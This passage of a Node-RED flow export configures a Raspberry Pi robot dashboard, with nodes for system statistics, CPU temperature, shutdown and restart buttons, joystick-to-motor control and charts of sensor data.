        "x": 910,
        "y": 660,
        "wires": []
    },
    {
        "id": "cd388343e79e2575",
        "type": "function",
        "z": "SpiderPig420",
        "name": "format time nicely",
        "func": "msg.payload = Date(msg.payload).toString();\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 370,
        "y": 660,
        "wires": [
            [
                "c8c035060cca9b2b"
            ]
        ]
    },
    {
        "id": "b9bf336042cc9075",
        "type": "debug",
        "z": "119587e64ad8891c",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 670,
        "y": 100,
        "wires": []
    },
    {
        "id": "92d41cc3766e0e0c",
        "type": "debug",
        "z": "119587e64ad8891c",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 670,
        "y": 140,
        "wires": []
    },
    {
        "id": "fa645328d696a2ce",
        "type": "debug",
        "z": "119587e64ad8891c",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 670,
        "y": 220,
        "wires": []
    },
    {
        "id": "0beb1916f49ed178",
        "type": "debug",
        "z": "119587e64ad8891c",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 670,
        "y": 260,
        "wires": []
    },
    {
        "id": "9872f217db985c45",
        "type": "debug",
        "z": "119587e64ad8891c",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 670,
        "y": 300,
        "wires": []
    },
    {
        "id": "183def3d8a7b17b4",
        "type": "debug",
        "z": "119587e64ad8891c",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 670,
        "y": 340,
        "wires": []
    },
    {
        "id": "c86119855d64dc42",
        "type": "debug",
        "z": "119587e64ad8891c",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 670,
        "y": 180,
        "wires": []
    },
    {
        "id": "a1b0b165d5d3a3a8",
        "type": "inject",
        "z": "119587e64ad8891c",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payloadType": "date",
        "x": 170,
        "y": 100,
        "wires": [
            [
                "d4880557ab9ecb4b"
            ]
        ]
    },
    {
        "id": "b1cd442afd40f0b6",
        "type": "inject",
        "z": "119587e64ad8891c",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payloadType": "date",
        "x": 170,
        "y": 140,
        "wires": [
            [
                "1e5432169692a432"
            ]
        ]
    },
    {
        "id": "8ea8a7c4e65a3dfd",
        "type": "inject",
        "z": "119587e64ad8891c",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payloadType": "date",
        "x": 170,
        "y": 180,
        "wires": [
            [
                "ac557150eadb473a"
            ]
        ]
    },
    {
        "id": "67dd78967753f91f",
        "type": "inject",
        "z": "119587e64ad8891c",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payloadType": "date",
        "x": 170,
        "y": 220,
        "wires": [
            [
                "8d006e92f67ce78e"
            ]
        ]
    },
    {
        "id": "ea3a760e5c275913",
        "type": "inject",
        "z": "119587e64ad8891c",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payloadType": "date",
        "x": 170,
        "y": 260,
        "wires": [
            [
                "63d7acbc77f366ed"
            ]
        ]
    },
    {
        "id": "1413e27ab20483fc",
        "type": "inject",
        "z": "119587e64ad8891c",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payloadType": "date",
        "x": 170,
        "y": 300,
        "wires": [
            [
                "a3039de980d526a4"
            ]
        ]
    },
    {
        "id": "cea73d05c419a27e",
        "type": "inject",
        "z": "119587e64ad8891c",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payloadType": "date",
        "x": 170,
        "y": 340,
        "wires": [
            [
                "89d742c80f4b95ba"
            ]
        ]
    },
    {
        "id": "151670873aed1d16",
        "type": "exec",
        "z": "119587e64ad8891c",
        "command": "/opt/vc/bin/vcgencmd measure_temp",
        "addpay": "",
        "append": "",
        "useSpawn": "false",
        "timer": "",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 250,
        "y": 440,
        "wires": [
            [
                "e223561d690d39e0"
            ],
            [],
            []
        ]
    },
    {
        "id": "36abaa357e90823b",
        "type": "inject",
        "z": "119587e64ad8891c",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payloadType": "date",
        "x": 170,
        "y": 380,
        "wires": [
            [
                "151670873aed1d16"
            ]
        ]
    },
    {
        "id": "e223561d690d39e0",
        "type": "function",
        "z": "119587e64ad8891c",
        "name": "",
        "func": "msg.payload = msg.payload.replace(\"temp=\",\"\").replace(\"'C\\n\",\"\");\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 360,
        "y": 380,
        "wires": [
            [
                "31746d72b616a789",
                "2bc9b2c347cbc1a3"
            ]
        ]
    },
    {
        "id": "31746d72b616a789",
        "type": "debug",
        "z": "119587e64ad8891c",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 670,
        "y": 380,
        "wires": []
    },
    {
        "id": "1fd47698e5ce335b",
        "type": "inject",
        "z": "119587e64ad8891c",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "Shutdown",
        "payloadType": "str",
        "x": 340,
        "y": 520,
        "wires": [
            [
                "80182f60cd897ae9"
            ]
        ]
    },
    {
        "id": "328b54f9c997e7f2",
        "type": "inject",
        "z": "119587e64ad8891c",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "Restart",
        "payloadType": "str",
        "x": 330,
        "y": 560,
        "wires": [
            [
                "90f0fb63aa744ddf"
            ]
        ]
    },
    {
        "id": "699fd6a9047725f9",
        "type": "inject",
        "z": "119587e64ad8891c",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "Power Down",
        "payloadType": "str",
        "x": 350,
        "y": 600,
        "wires": [
            [
                "626b75e4e6112120",
                "c5183dbc8a6d12e1"
            ]
        ]
    },
    {
        "id": "626b75e4e6112120",
        "type": "delay",
        "z": "119587e64ad8891c",
        "name": "",
        "pauseType": "delay",
        "timeout": "1",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": false,
        "allowrate": false,
        "outputs": 1,
        "x": 500,
        "y": 600,
        "wires": [
            [
                "7a1f34eb7caee818"
            ]
        ]
    },
    {
        "id": "c5183dbc8a6d12e1",
        "type": "link out",
        "z": "119587e64ad8891c",
        "name": "",
        "mode": "link",
        "links": [
            "c61bd894dafc6708",
            "425242144c97ba17"
        ],
        "x": 455,
        "y": 640,
        "wires": []
    },
    {
        "id": "1496b2b532c8032b",
        "type": "ui_button",
        "z": "119587e64ad8891c",
        "name": "",
        "group": "d52b17e5862adc94",
        "order": 17,
        "width": 3,
        "height": 1,
        "passthru": false,
        "label": "Shutdown RPI",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "Shutdown RPI",
        "topicType": "str",
        "x": 160,
        "y": 520,
        "wires": [
            [
                "80182f60cd897ae9"
            ]
        ]
    },
    {
        "id": "cfb8dde55ba3f97e",
        "type": "ui_button",
        "z": "119587e64ad8891c",
        "name": "",
        "group": "d52b17e5862adc94",
        "order": 18,
        "width": 3,
        "height": 1,
        "passthru": false,
        "label": "Restart RPI",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "Restart RPI",
        "topicType": "str",
        "x": 150,
        "y": 560,
        "wires": [
            [
                "90f0fb63aa744ddf"
            ]
        ]
    },
    {
        "id": "a09b71184df41813",
        "type": "ui_button",
        "z": "119587e64ad8891c",
        "name": "",
        "group": "d52b17e5862adc94",
        "order": 19,
        "width": 3,
        "height": 1,
        "passthru": false,
        "label": "Power Down",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "Power Down",
        "topicType": "str",
        "x": 150,
        "y": 600,
        "wires": [
            [
                "626b75e4e6112120",
                "c5183dbc8a6d12e1"
            ]
        ]
    },
    {
        "id": "49413dc4472f72ef",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 2,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "{{msg.payload.hostname}}",
        "format": "",
        "layout": "row-spread",
        "className": "",
        "x": 510,
        "y": 100,
        "wires": []
    },
    {
        "id": "9fcdf3770aa1cc5c",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 1,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "OS hostname:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 880,
        "y": 100,
        "wires": []
    },
    {
        "id": "29c9702a9d3ac04b",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 4,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "{{msg.payload[0].size}}, {{msg.payload[0].available}}",
        "format": "",
        "layout": "row-spread",
        "className": "",
        "x": 510,
        "y": 140,
        "wires": []
    },
    {
        "id": "bcadfb3cddac5830",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 3,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "Drive (size, free):",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 890,
        "y": 140,
        "wires": []
    },
    {
        "id": "1613619d6ca16c80",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 6,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "{{msg.payload.uptime}}",
        "format": "",
        "layout": "row-spread",
        "className": "",
        "x": 510,
        "y": 180,
        "wires": []
    },
    {
        "id": "9c4a0231819bc477",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 5,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "Uptime:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 860,
        "y": 180,
        "wires": []
    },
    {
        "id": "7a0fc06ed541fdc3",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 8,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "{{msg.payload.cpus[0].speed}}, {{msg.payload.cpus[1].speed}}, {{msg.payload.cpus[2].speed}}, {{msg.payload.cpus[3].speed}}",
        "format": "",
        "layout": "row-spread",
        "className": "",
        "x": 510,
        "y": 220,
        "wires": []
    },
    {
        "id": "fd25296748ef3c4b",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 7,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "CPU speed:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 870,
        "y": 220,
        "wires": []
    },
    {
        "id": "321e34ecf7908800",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 9,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "CPU load:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 870,
        "y": 260,
        "wires": []
    },
    {
        "id": "55d579c4ec1d6a92",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 10,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "{{msg.payload.loadavg[0]}}, {{msg.payload.loadavg[1]}}, {{msg.payload.loadavg[2]}}",
        "format": "",
        "layout": "row-spread",
        "className": "",
        "x": 510,
        "y": 260,
        "wires": []
    },
    {
        "id": "8da979ede396527a",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 12,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "{{msg.payload.totalmem}}, {{msg.payload.freemem}}",
        "format": "",
        "layout": "row-spread",
        "className": "",
        "x": 510,
        "y": 300,
        "wires": []
    },
    {
        "id": "a83f63070d95a790",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 11,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "RAM (size, free):",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 890,
        "y": 300,
        "wires": []
    },
    {
        "id": "5156e2e12334417f",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 13,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "IP address:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 870,
        "y": 340,
        "wires": []
    },
    {
        "id": "b2ebfa8b8938d1bc",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 14,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "{{msg.payload.networkInterfaces.wlan0[0].address}}",
        "format": "",
        "layout": "row-spread",
        "className": "",
        "x": 510,
        "y": 340,
        "wires": []
    },
    {
        "id": "2bc9b2c347cbc1a3",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 16,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "{{msg.payload}}",
        "format": "",
        "layout": "row-spread",
        "className": "",
        "x": 510,
        "y": 380,
        "wires": []
    },
    {
        "id": "2005f8255e7dd7bc",
        "type": "ui_text",
        "z": "119587e64ad8891c",
        "group": "d52b17e5862adc94",
        "order": 15,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "CPU temp:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 870,
        "y": 380,
        "wires": []
    },
    {
        "id": "d4880557ab9ecb4b",
        "type": "OS",
        "z": "119587e64ad8891c",
        "name": "",
        "x": 330,
        "y": 100,
        "wires": [
            [
                "b9bf336042cc9075",
                "49413dc4472f72ef"
            ]
        ]
    },
    {
        "id": "1e5432169692a432",
        "type": "Drives",
        "z": "119587e64ad8891c",
        "name": "",
        "x": 330,
        "y": 140,
        "wires": [
            [
                "92d41cc3766e0e0c",
                "29c9702a9d3ac04b"
            ]
        ]
    },
    {
        "id": "ac557150eadb473a",
        "type": "Uptime",
        "z": "119587e64ad8891c",
        "name": "",
        "x": 340,
        "y": 180,
        "wires": [
            [
                "c86119855d64dc42",
                "1613619d6ca16c80"
            ]
        ]
    },
    {
        "id": "8d006e92f67ce78e",
        "type": "CPUs",
        "z": "119587e64ad8891c",
        "name": "",
        "x": 330,
        "y": 220,
        "wires": [
            [
                "fa645328d696a2ce",
                "7a0fc06ed541fdc3"
            ]
        ]
    },
    {
        "id": "63d7acbc77f366ed",
        "type": "Loadavg",
        "z": "119587e64ad8891c",
        "name": "",
        "x": 340,
        "y": 260,
        "wires": [
            [
                "0beb1916f49ed178",
                "55d579c4ec1d6a92"
            ]
        ]
    },
    {
        "id": "a3039de980d526a4",
        "type": "Memory",
        "z": "119587e64ad8891c",
        "name": "",
        "scale": "Byte",
        "x": 340,
        "y": 300,
        "wires": [
            [
                "9872f217db985c45",
                "8da979ede396527a"
            ]
        ]
    },
    {
        "id": "89d742c80f4b95ba",
        "type": "NetworkIntf",
        "z": "119587e64ad8891c",
        "name": "",
        "x": 350,
        "y": 340,
        "wires": [
            [
                "183def3d8a7b17b4",
                "b2ebfa8b8938d1bc"
            ]
        ]
    },
    {
        "id": "90f0fb63aa744ddf",
        "type": "restart",
        "z": "119587e64ad8891c",
        "name": "",
        "x": 510,
        "y": 560,
        "wires": []
    },
    {
        "id": "80182f60cd897ae9",
        "type": "shutdown",
        "z": "119587e64ad8891c",
        "name": "",
        "x": 520,
        "y": 520,
        "wires": []
    },
    {
        "id": "7a1f34eb7caee818",
        "type": "shutdown",
        "z": "119587e64ad8891c",
        "name": "",
        "x": 680,
        "y": 600,
        "wires": []
    },
    {
        "id": "78be99a6182b7071",
        "type": "debug",
        "z": "5c3cf3d89dd2afb1",
        "name": "debug",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 470,
        "y": 1040,
        "wires": []
    },
    {
        "id": "96735c606d0b6648",
        "type": "rbe",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "func": "rbe",
        "gap": "",
        "start": "",
        "inout": "out",
        "septopics": true,
        "property": "payload",
        "topi": "topic",
        "x": 330,
        "y": 1040,
        "wires": [
            [
                "78be99a6182b7071"
            ]
        ]
    },
    {
        "id": "73251bf7bc549723",
        "type": "rbe",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "func": "rbe",
        "gap": "",
        "start": "",
        "inout": "out",
        "septopics": true,
        "property": "payload",
        "topi": "topic",
        "x": 290,
        "y": 1100,
        "wires": [
            [
                "20df5d8e98c15b7f"
            ]
        ]
    },
    {
        "id": "20df5d8e98c15b7f",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "func": "let keyVal = msg.key;\nlet slideVal = msg.payload;\nif (keyVal == \"left\") {\n    msg.slide = slideVal - .5;\n}  else if (keyVal == \"right\") {\n    slideVal = slideVal + .5;\n} else {\n    slideVal = slideVal;\n}\nmsg.payload = slideVal;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 440,
        "y": 1100,
        "wires": [
            [
                "972a2419c4c3a8c2"
            ]
        ]
    },
    {
        "id": "f1eef116120c9cfc",
        "type": "debug",
        "z": "5c3cf3d89dd2afb1",
        "name": "to PMW",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": true,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "payload",
        "statusType": "auto",
        "x": 720,
        "y": 1180,
        "wires": []
    },
    {
        "id": "7c5e3c8df1fbd991",
        "type": "change",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "slider",
                "pt": "flow",
                "to": "payload",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 500,
        "y": 1200,
        "wires": [
            [
                "f1eef116120c9cfc"
            ]
        ]
    },
    {
        "id": "2b86f7480e2e9c1e",
        "type": "change",
        "z": "5c3cf3d89dd2afb1",
        "name": "get slider value",
        "rules": [
            {
                "t": "set",
                "p": "slider",
                "pt": "msg",
                "to": "slider",
                "tot": "flow"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 320,
        "y": 1160,
        "wires": [
            [
                "88d9c3e0fe872fbe"
            ]
        ]
    },
    {
        "id": "88d9c3e0fe872fbe",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "inc/dec/dheck",
        "func": "const MIN = 16;\nconst MAX = 24;\nconst INC = 0.5;\n\nlet slider = msg.slider || MIN;\n\nswitch(msg.payload) {\n    case 37:\n        //left arrow\n        slider -= INC;\n    break;\n    \n    case 39:\n        //right arrow\n        slider += INC;\n    break;\n}\n\nif (slider < MIN) {\n    slider = MIN;\n} else if (slider > MAX) {\n    slider = MAX;\n}\n\nmsg.payload = slider;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 500,
        "y": 1160,
        "wires": [
            [
                "b79bcec0bfcbf5df",
                "f1eef116120c9cfc"
            ]
        ]
    },
    {
        "id": "b79bcec0bfcbf5df",
        "type": "change",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "slider",
                "pt": "flow",
                "to": "payload",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 160,
        "y": 1200,
        "wires": [
            [
                "38ad8ad9799375a3"
            ]
        ]
    },
    {
        "id": "11fc91b754991002",
        "type": "inject",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "Inject Go Dir",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"cmd\":\"go\",\"dir\":[100,100]}",
        "payloadType": "json",
        "x": 170,
        "y": 1300,
        "wires": [
            [
                "c26ce3f431702f38"
            ]
        ]
    },
    {
        "id": "c26ce3f431702f38",
        "type": "json",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 370,
        "y": 1380,
        "wires": [
            [
                "b6670f98ce3c9b5a",
                "54b3da21c11695f7",
                "f3098638cfe5fbb1"
            ]
        ]
    },
    {
        "id": "48e217a30e1c1c02",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "Joystick",
        "func": "var x = (msg.payload.vector.x || 0);\nvar y = (msg.payload.vector.y || 0);\nvar m = {};\nx = Math.round(x*50);\ny = Math.round(y*50);\nm.cmd = \"go\";\nm.dir = [x, y];\n//return {payload:m};\n\n//var desiredSpeed = msg.payload.dir[1];\n//var desiredDirection = msg.payload.dir[0];\n//speedRM = desiredSpeed - desiredDirection\n//speedLM = desiredSpeed + desiredDirection\nvar vRM = y + x\nvar vLM = y - x\n\n//Arduino\n\nif (vRM >= 100) {vRM = 100;}\nif (vLM >= 100) {vLM = 100;}\n//msg.payload = \"SET MR 50\\n\" + \"SET ML 50\";\n//msg.payload = \"SET MR \" + vRM.toString() + \"\\n\" + \"SET ML \" + vLM.toString();\n//return msg;\nmsg.payload = {\"cmd\":\"mot\",\"val\":[vRM,vLM]};\nreturn [{payload:m}, msg];",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 280,
        "y": 480,
        "wires": [
            [
                "c63c8abcdc5b833d",
                "6acab2e55f32d317"
            ],
            [
                "e41c7b24d7fee001"
            ]
        ]
    },
    {
        "id": "b6670f98ce3c9b5a",
        "type": "debug",
        "z": "5c3cf3d89dd2afb1",
        "name": "debug",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 530,
        "y": 1380,
        "wires": []
    },
    {
        "id": "862ff696965e44b8",
        "type": "inject",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "Inject Sens Pwr",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"cmd\":\"pwr\", \"val\":[5.4,5.6,1.1,1.2,1.3,1.4]}",
        "payloadType": "json",
        "x": 180,
        "y": 1340,
        "wires": [
            [
                "c26ce3f431702f38"
            ]
        ]
    },
    {
        "id": "a0c70cc74e149828",
        "type": "inject",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "Inject Sens Cliff",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"cmd\":\"cliff\",\"val\":[1,1.5,2.5,2,3,1.2]}",
        "payloadType": "json",
        "x": 180,
        "y": 1380,
        "wires": [
            [
                "c26ce3f431702f38"
            ]
        ]
    },
    {
        "id": "592219f8ca4300b4",
        "type": "inject",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "Inject Sens Dist",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"cmd\":\"dist\", \"val\":[0.8,1,1,0.8]}",
        "payloadType": "json",
        "x": 180,
        "y": 1420,
        "wires": [
            [
                "c26ce3f431702f38"
            ]
        ]
    },
    {
        "id": "c0bb8c528d811b1c",
        "type": "switch",
        "z": "5c3cf3d89dd2afb1",
        "name": "Check cmd",
        "property": "payload.cmd",
        "propertyType": "msg",
        "rules": [
            {
                "t": "eq",
                "v": "pwr",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "cliff",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "dist",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "bump",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "enc",
                "vt": "str"
            }
        ],
        "checkall": "true",
        "repair": false,
        "outputs": 5,
        "x": 450,
        "y": 800,
        "wires": [
            [
                "57b107b84bc1773b",
                "835eb9c7a61aba80"
            ],
            [
                "53848db5e886f7e8",
                "4079edf355144248"
            ],
            [
                "43b30997c62fa7e5"
            ],
            [
                "9621403163627b20"
            ],
            [
                "f835af2b91efdd51",
                "d4c5af175d2f35c0",
                "d27916fcd7be9013"
            ]
        ]
    },
    {
        "id": "53848db5e886f7e8",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "func": "var m = {};\nm.labels = [\"Front\", \"Rear\"];\nm.series = ['L', 'M', 'R'];\nm.data = [\n    [msg.payload.val[0], msg.payload.val[3]],\n    [msg.payload.val[1], msg.payload.val[4]],\n    [msg.payload.val[2], msg.payload.val[5]],\n  ];\nreturn {payload:[m],topic:msg.topic};\n/*\nvar m = {};\nm.labels = [\"Front\", \"Rear\"];\nm.series = ['L', 'M', 'R'];\nm.data = [\n    [1, 4],\n    [4, 1],\n    [1, 4],\n  ];\nreturn {payload:[m],topic:msg.topic};\n*/",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 660,
        "y": 720,
        "wires": [
            [
                "0e4762c089b17f6d"
            ]
        ]
    },
    {
        "id": "835eb9c7a61aba80",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "func": "var m={\n    \"series\":[\"Current:\"],\n    \"data\":[[msg.payload.val[2]*0.0025, msg.payload.val[3]*0.0025,\n            msg.payload.val[4]*0.0025, msg.payload.val[5]*0.0025]],\n    \"labels\":[\"Arduino\",\"Raspberry\",\"Left Motor\",\"Right Motor\"]\n};\nreturn {payload:[m]};\n/*\nvar m={\n    \"series\":[\"Current:\"],\n    \"data\":[[0.65, 1.2, 0.5, 0.75]],\n    \"labels\":[\"Arduino\",\"Raspberry\",\"Left Motor\",\"Right Motor\"]\n};\nreturn {payload:[m]};\n*/",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 660,
        "y": 680,
        "wires": [
            [
                "dc27ce218486add2"
            ]
        ]
    },
    {
        "id": "43b30997c62fa7e5",
        "type": "function",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "func": "var m = {};\nm.labels = [\"Left\", \"Middle\", \"Right\", \"Rear\"];\nm.series = ['Distance'];\nm.data = [\n    [msg.payload.val[0], msg.payload.val[1], msg.payload.val[2], msg.payload.val[3]],\n  ];\nreturn {payload:[m],topic:msg.topic};\n/*\nvar m = {};\nm.labels = [\"Left\", \"Middle\", \"Right\", \"Rear\"];\nm.series = ['Distance'];\nm.data = [\n    [0.3, 0.6, 0.5, 0.1],\n  ];\nreturn {payload:[m],topic:msg.topic};\n*/",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
